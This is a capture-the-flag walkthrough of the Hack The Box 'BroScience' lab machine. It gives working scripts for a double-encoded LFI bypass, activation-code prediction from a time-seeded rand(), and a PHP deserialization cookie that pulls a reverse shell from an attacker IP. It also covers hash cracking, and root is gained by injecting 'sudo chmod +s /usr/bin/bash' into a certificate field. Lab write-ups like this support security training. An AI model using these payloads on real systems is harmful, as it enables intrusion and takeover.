Add the `ip` to `/etc/hosts`:

```bash
echo "10.10.11.195	broscience.htb" | sudo tee -a /etc/hosts
```

Run some scans in the background to gather information.
- `autorecon`

```bash
sudo (which autorecon) broscience.htb
```

- You can see ports `80` and `443` open immediately from the `autorecon` output. Make sure when running `feroxbuster` you are pointing it towards the `https` version.
- `feroxbuster`

```bash
feroxbuster -u https://broscience.htb -k -n -t 5 -L 5 --filter-status 404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ferox_broscience_non_php_out.txt
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125001740.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125001947.png)

- You can create a username. You cannot access the email until you activate your account.
- If explains that it will email you, but after using a temporary email it can be determined that it does not.
- Browsing to:
	- [[https://broscience.htb/includes/]]

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125002247.png)

- The `img.php` endpoint is the only endpoint that returns any relevant feedback.
	- `**Error:** Missing 'path' parameter.`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125002415.png)

- You can try `/etc/passwd` and it will return an error message claiming an attack has been detected.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125002501.png)

- After some trial an error it can be determined that double url-encoding the file along with preprending `../../../../` will work, but it it will be displayed as an image.
- You will come to find you will be dialing in on quite a few files from the web-server.
- Here is a convenient `bash` script that uses `perl` to double `url-encode the text`.

```bash
#!/bin/bash

read -p "File: " file 
result=$(echo $file | perl -MURI::Escape -ne 'chomp;print uri_escape(uri_escape($_));')
echo $result
echo $result | xclip -selection clipboard
```

- If you have `xlip` installed it will clip it to your clipboard.
- Additionally, here is a `bash` script that accepts one argument that being the url-encoded file.

```bash
#!/bin/bash

curl -k "https://broscience.htb/includes/img.php?path=$1"
```

- It looks like this:

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125003351.png)

- Alternatively, I combined the two.

```bash
#!/bin/bash

read -p "File: " file
result=$(echo $file | perl -MURI::Escape -ne 'chomp;print uri_escape(uri_escape($_));')
echo -e "File URL-encoded in case you want it: $result"
curl -k "https://broscience.htb/includes/img.php?path=$result"
```

- You can use the following syntax to run the script, output it to console and add the content to a file named `testing.txt`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125003725.png)

- Here is the output of `users` with a usable shell in the `/etc/passwd` file:

```bash
cat broscience_etc_passwd.txt | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125003911.png)

- Now that we know we can access the file system with the `LFI` (local file inclusion) we should see if we can pull other additional files that are relevant.
- Here are the relevant files you will need prior to being url-encoded.

```bash
../../../../var/www/html/register.php
../../../../var/www/html/includes/db_connect.php
../../../../var/www/html/includes/img.php
../../../../var/www/html/includes/utils.php
// The below endpoint will not be used until a later point.
../../../../var/www/html/swap_theme.php
```

- `register.php`
- In the `register.php` code you can see a function that most likely comes from `includes/utils.php`.
- Whatever this code does will determine how the `$activation_code` variable is created. 
- On line `41` I made it a point to include the `md5($db_salt . $_POST['password'])` section to clarify that if/when we make it to the database there will be a `salt` attached to the password.
- Finally the `$activation_link` will be successful if there is a proper `$activation_code` following the `?code=` parameter passed to the `activate.php` endpoint.

```php
  34   │  include_once 'includes/utils.php';
  35   │  $activation_code = generate_activation_code();

  40   │  $res = pg_prepare($db_conn, "create_user_query", 'INSERT INTO users (username, password, email, activation_code) VALUES ($1, $2, $3, $4)');
  41   │  $res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));
  42   │ 
  43   │  // TODO: Send the activation link to email
  44   │  $activation_link = "https://broscience.htb/activate.php?code={$activation_code}";
  46   │  $alert = "Account created. Please check your email for the activation link.";
  47   │  $alert_type = "success";
  48   │      } else {
  49   │  $alert = "Failed to generate a valid activation code, please try again.";
```

- `utils.php`

```php
   1   │ <?php
   2   │ function generate_activation_code() {
   3   │     $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
   4   │     srand(time());
   5   │     $activation_code = "";
   6   │     for ($i = 0; $i < 32; $i++) {
   7   │         $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
   8   │     }
   9   │     return $activation_code;
  10   │ }
```

- The `srand(time())` function in the script is used to seed the random number generator with the current timestamp. This is done to ensure that the function generates a different activation code each time it's called. However, it's important to note that this method of seeding the random number generator is not truly random and should not be used for cryptographic purposes.

- The reason for this is that the time function returns the current time in seconds, which is not truly random. An attacker can guess the seed by measuring the time of execution of a program and then use this information to predict the outcome of random number generator. This can be a security vulnerability if the activation code is used for sensitive operations, like authentication or encryption.

Using this information we can activate an activation code!
- In order to accomplish this we need:
	- A newly created user.
	- The time-zone of the web-server.
- Go to:
	- [[https://broscience.htb/register.php]]
	- Open the developer tools and navigate to the `Network` tab.
	- Finalize creating a user.
	- Go to the `Response Headers` and check the `Date`.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125010954.png)

- Convert this time to Unix Epoch time. Below I will include three scripts.
	- `time.php`
		- This will convert the time-stamp to the Unix Epoch time.
		- Alternatively:
			- [[https://www.epochconverter.com/]]
	- `seed.php`
		- This will take the previous time that was output from `time.php` and convert that time to the string within the `utils.php` `generate_activation_code()` function.
		- The code generates a 32 character long string based on the time. So if you can determine the time then you can determine the 32 character string.
		- You can also copy the code directly from the `generate_activation_code()` function, ensure `srand(your_time)` has your timestamp along with using `echo` on the function to ensure that the `return` statement is echoed to the console.
	- `/activate.sh`
		- This will take one argument which will be the `seed` code we previously generated.
		- The activation code is taken straight from the endpoint linked in the `register.php` code.
			- `https://broscience.htb/activate.php?code=your_code`
- `time.php`

```bash
cat time.php

<?php
$time = readline("Time: ");
$unix_timestamp = strtotime($time);
echo $unix_timestamp;
?>
```

- `seed.php`

```bash
cat seed.php

<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    $seed = readline("Seed value: ");
    srand($seed);
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

echo generate_activation_code();

?>
```

- `activate.sh`

```bash
cat activate.sh

#!/bin/bash

curl -k "https://broscience.htb/activate.php?code=$1"
```


![image](https://0xc0rvu5.github.io/docs/assets/images/20230125011554.png)

- You can try to editing your user and user id, but nothing seems to work.
- Take not of the icon on the left in the photo below. This will come into play in a bit.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125012521.png)

- `db_connect.php`
- If we can access the database we now know the relevant credentials. The `db_host` is localhost so expect to try this out when we get a shell. 

```php
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>
```

- `swap_theme.php`
- We can see this is making a call to the `includes/utils.php` file in regards to the `get_theme()` function.

```php
<?php
session_start();

// Check if user is logged in already
if (!isset($_SESSION['id'])) {
    header('Location: /index.php');
}

// Swap the theme
include_once "includes/utils.php";
if (strcmp(get_theme(), "light") === 0) {
    set_theme("dark");
} else {
    set_theme("light");
}

// Redirect
if (!empty($_SERVER['HTTP_REFERER'])) {
    header("Location: {$_SERVER['HTTP_REFERER']}");
} else {
    header("Location: /index.php");
}
```

- `utils.php`
- This script creates two classes, Avatar and `AvatarInterface`. The Avatar class has two methods: a constructor that takes an image path as an argument and assigns it to the `$imgPath` property, and a `save()` method that takes a temporary file path as an argument, opens a file using the `$imgPath` property as the file path, writes the contents of the temporary file to it, and then closes the file.
- The `AvatarInterface` class has two properties: `$tmp` and `$imgPath`, and one method, `__wakeup()`. The `__wakeup()` method is a magic method that is called when an object is unserialized. In this case, when an `AvatarInterface` object is unserialized, the `__wakeup()` method creates a new Avatar object, passing the `$imgPath` property as the argument. Then it calls the `save()` method on the Avatar object, passing the `$tmp` property as the argument.
- At the end of the script, it creates an instance of `AvatarInterface`, assigns values to the `$tmp` and `$imgPath` properties, then it serialize the object and encode it in base64.
	- Here is a great reference:
		- [[https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a]]

```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

function get_theme_class($theme = null) {
    if (!isset($theme)) {
        $theme = get_theme();
    }
    if (strcmp($theme, "light")) {
        return "uk-light";
    } else {
        return "uk-dark";
    }
}

function set_theme($val) {
    if (isset($_SESSION['id'])) {
        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
    }
}

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>
```

- `img.php`
	- The `$ImgPath` will then be url-decoded.

```php
<?php
if (!isset($_GET['path'])) {
    die('<b>Error:</b> Missing \'path\' parameter.');
}

// Check for LFI attacks
$path = $_GET['path'];

$badwords = array("../", "etc/passwd", ".ssh");
foreach ($badwords as $badword) {
    if (strpos($path, $badword) !== false) {
        die('<b>Error:</b> Attack detected.');
    }
}

// Normalize path
$path = urldecode($path);

// Return the image
header('Content-Type: image/png');
echo file_get_contents('/var/www/html/images/' . $path);
?>
```

- `cookie.php`
	- Reference:
		- [[https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a]]
	- The code below will require a reverse server up and listening and a `php` reverse shell at `rev.php`.
	- The `rev.php` reverse-shell will be written to disk. 
	- You will then have to manually change the `user-prefs` cookie in the `applications` tab of the developer console.
	- Ensure you have an active server up with `rev.php`
		- `python -m http.server` 
	- Change the background to `light` or `dark`.
	- You will then be able to access the shell at `https://broscience.htb/rev.php`

```php
<?php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath;

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$user_data = new AvatarInterface();
$user_data->tmp = "http://10.10.16.23:8000/rev.php";
$user_data->imgPath = "/var/www/html/hello.php";

echo base64_encode(serialize($user_data));

?>
```

- `utils.php` (again)
- The cookie that we just generated with the above code will be changed in the console. When this occurs the `$up` variable will deserialize the code. This code will then be passed into the `get_theme_class` function. When the theme is toggled to `light` or `dark` the code we created will be parsed and this will activate the code and pull the `rev.php` from your server.

```php
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

function get_theme_class($theme = null) {
    if (!isset($theme)) {
        $theme = get_theme();
    }
    if (strcmp($theme, "light")) {
        return "uk-light";
    } else {
        return "uk-dark";
    }
}

function set_theme($val) {
    if (isset($_SESSION['id'])) {
        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
    }
}
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125020304.png)

- Create a reverse shell

```bash
rlwarp nc -lvnp 4444
```
- Go to `https://broscience.htb/hello.php`
- First shell!

#### Shell as `www-data`
- I wasn't wasting anytime. You can check `netstat -at` to see the `postgres` database up and running and listening.

```bash
psql -h 127.0.0.1 -U 'dbuser' -p 5432 broscience
Password: RangeOfMotion%777
```

- List tables:

```postgres
\d
                List of relations
 Schema |       Name       |   Type   |  Owner   
--------+------------------+----------+----------
 public | comments         | table    | postgres
 public | comments_id_seq  | sequence | postgres
 public | exercises        | table    | postgres
 public | exercises_id_seq | sequence | postgres
 public | users            | table    | postgres
 public | users_id_seq     | sequence | postgres
(6 rows)
```

- Show content from `users` table:

```postgres
select * from users;
 id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          
----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------
  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05
  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04
  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04
  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04
  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04
  6 | spirit        | 87058565293b7c7cb027bee804671295 | spirit@gmail.com             | Od7D6uwayh3w7fC2NEJhmLJNxnfbix6L | f            | f        | 2023-01-25 03:10:16.644266-05
```

- We'll take those hashes and acknowledge the `salt` that we previously recognized in `register.php` and ensure it is added to each hash.
- `register.php` code:
	- `md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));`
- Salt:
	- `$db_salt = "NaCl";`

- Hash file:
	- **There were a few more at the time of grabbing them.**

```bash
cat hashes 

15657792073e8a843d4f91fc403454e1:NaCl
13edad4932da9dbb57d9cd15b66ed104:NaCl
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
a7eed23a7be6fe0d765197b1027453fe:NaCl
5d15340bded5b9395d5d14b9c21bc82b:NaCl
87058565293b7c7cb027bee804671295:NaCl
87058565293b7c7cb027bee804671295:NaCl
87058565293b7c7cb027bee804671295:NaCl
5ee2c806fa42a3500dbf2ec17c02337d:NaCl
87058565293b7c7cb027bee804671295:NaCl
87058565293b7c7cb027bee804671295:NaCl
87058565293b7c7cb027bee804671295:NaCl
```

- We will use `Hash-Mode` number `20` with `hashcat`.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125021906.png)

- Run `hashcat`:

```bash
hashcat -a 0 -m 20 hashes rockyou.txt
```

- Output:

```bash
87058565293b7c7cb027bee804671295:NaCl:1234                
5ee2c806fa42a3500dbf2ec17c02337d:NaCl:nivea               
13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym    
5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest     
bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
```

- We have success using `ssh` logging in as `bill` with the password `iluvhorsesandgym`

```bash
ssh bill@broscience.htb
Password: iluvhorsesandgym
```

- We can grab the `user.txt` flag now.

```bash
cat user.txt
433e2ec578d02d8baadf6e86514e0bb6
```

- After manual enumeration it was deemed necessary to grab `linpeas.sh`.
- Might as well grab `pspy64` while you're at it to monitor processes.
- `Host`

```bash
python -m http.server
```

- `Victim`

```bash
cd /tmp
wget http://10.10.16.23:8000/linpeas.sh
wget http://10.10.16.23:8000/pspy64
chmod +x linpeas.sh pspy64
```

- In the `/opt` directory you will find a file named `renew_cert.sh`
- You can see that the script can be executed by anyone.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125024249.png)

- This script can be vulnerable to injection attacks if the user input is not properly sanitized. The script takes a single argument, a certificate file, and performs various operations on it, such as checking its expiration date, parsing its subject field, and generating a new certificate.
- For example, if an attacker is able to pass a malicious file path to the script, it could potentially execute code from that file, or if an attacker can manipulate the subject field of the certificate, it could include malicious code that would be executed when the script parses the subject field.
- Additionally, the script is using echo command to output the subject field of the certificate and to generate the new certificate. In this case, if the subject field contains malicious code, it will be executed when the script runs the echo command.

```bash
cat renew_cert.sh 
#!/bin/bash

if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;
fi

if [ -f $1 ]; then

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)

    country=${country:4}
    state=$(echo ${state:5} | awk -F, '{print $1}')
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

    echo $subject;
    echo "";
    echo "Country     => $country";
    echo "State       => $state";
    echo "Locality    => $locality";
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";
    echo "Common Name => $commonName";
    echo "Email       => $emailAddress";

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
    $state
    $locality
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
else
    echo "File doesn't exist"
    exit 1;
```

- You can create a certificate in the `home/bill/Certs/` directory and make sure the file has the `crt` extension.
- Once ran you will be prompted for information pertaining to the certificate.
- I ran through each category and insert a malicious payload to turn the `s` bit on for `/usr/bin/bash`
- Here are the categories form the above code:

```bash
    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
    emailAddress=$(openssl x509 -in $1 -noout -email)
```

- Here is the command to initiate the key:

```bash
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days 1
```

- Here is what my output looked like:

```bash
Country     => AU
State       => Some-State
Locality    => 
Org Name    => Internet Widgits Pty Ltd
Org Unit    => 
Common Name => "`sudo chmod +s /usr/bin/bash`"
Email       => 
```

- This was the payload.

```bash
sudo chmod +s /usr/bin/bash
```

- Make sure you are in the same directory as the script if you run it this way:

```bash
cd /opt
./renew_cert.sh /home/bill/Certs/broscience.crt
```
- Otherwise:

```bash
bash /opt/renew_cert.sh /home/bill/Certs/broscience.crt
```

- Note that I had been successful without `sudo` and with `sudo`. I had changed the `-s` bit to off to try again. It was sporadic with the two successful attempts.
- I was concerned I hadn't completed it myself, but I caught the process in action with `pspy64` with the `sudo` attempt.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125025156.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20230125025219.png)

- Then you can grab the flags!

```bash
cat /home/bill/user.txt 

433e2ec578d02d8baadf6e86514e0bb6

cat /root/root.txt 

5a9a826a447cb356c317ec47881c4385
```

#hacking
